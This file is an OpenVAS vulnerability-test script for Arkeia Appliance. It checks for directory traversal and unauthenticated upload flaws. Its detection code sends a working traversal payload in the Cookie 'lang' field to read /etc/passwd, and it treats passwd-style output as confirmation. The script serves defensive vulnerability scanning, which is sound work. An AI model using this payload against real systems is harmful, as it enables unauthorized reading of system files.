###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_arkeia_virtual_appliance_mult_vuln.nasl 6086 2017-05-09 09:03:30Z teissa $
#
# Arkeia Appliance Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803760";
CPE = "cpe:/a:knox_software:arkeia_appliance";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6086 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-09 11:03:30 +0200 (Tue, 09 May 2017) $");
  script_tag(name:"creation_date", value:"2013-09-18 15:16:06 +0530 (Wed, 18 Sep 2013)");
  script_name("Arkeia Appliance Multiple Vulnerabilities");

 tag_summary =
"This host is running Arkeia Appliance and is prone to multiple
vulnerabilities.";

  tag_vuldetect =
"Send the crafted HTTP GET request and check is it possible to read
the system file or not.";

  tag_insight =
"Multiple flaws are due,
 - There are no restrictions when a POST request is send to
   '/scripts/upload.php' thus allowing any unauthenticated client to upload
   any data to the /tmp/ApplianceUpdate file.
 - Input passed via 'lang' parameter to 'Cookie' field in HTTP header is not
   properly sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow remote attackers to perform directory
traversal attacks and read arbitrary files on the affected application.
arbitrary data.

Impact Level: Application";

  tag_affected =
"Arkeia Appliance Version 10.0.10 and prior.";

  tag_solution =
"Upgrade to Arkeia Appliance 10.1.10 or later,
For updates refer to http://www.arkeia.com/download ";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/28330");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/123275");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_arkeia_virtual_appliance_detect.nasl");
  script_mandatory_keys("ArkeiaAppliance/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");

## Variable Initialization
req = "";
res = "";
host = "";
port = 0;

## Get HTTP Port
port = get_app_port( cpe:CPE, service:'www');
if(!port){
  exit(0);
}

## Exit if not able to get hostname
host = get_host_name();
if(!host){
  exit(0);
}

## Construct the attack request
attack = "lang=../../../../../../../../../../../../../../../../etc/passwd%00";
req = string("GET / HTTP/1.1\r\n",
             "Host: ",host,"\r\n",
             "Cookie: ", attack,"\r\n\r\n");
res = http_send_recv(port:port, data:req, bodyonly:FALSE);

## Confirm the exploit
if(res && res =~ "root:.*:0:[01]:")
{
  security_message(port);
  exit(0);
}
